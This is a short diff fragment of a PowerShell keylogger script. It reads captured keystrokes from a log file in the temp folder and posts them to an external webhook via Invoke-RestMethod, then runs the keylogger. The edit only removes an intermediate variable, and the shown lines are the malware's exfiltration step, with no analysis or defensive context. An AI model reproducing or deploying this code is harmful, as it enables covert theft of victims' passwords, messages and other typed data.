@@ -63,10 +63,9 @@ $Body = @{
   
   'content' = get-content $env:temp/keylogger.log
 }
-$Send_info = Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
   }
 }
 
 # run keylogger
 KeyLogger
-$Send_info
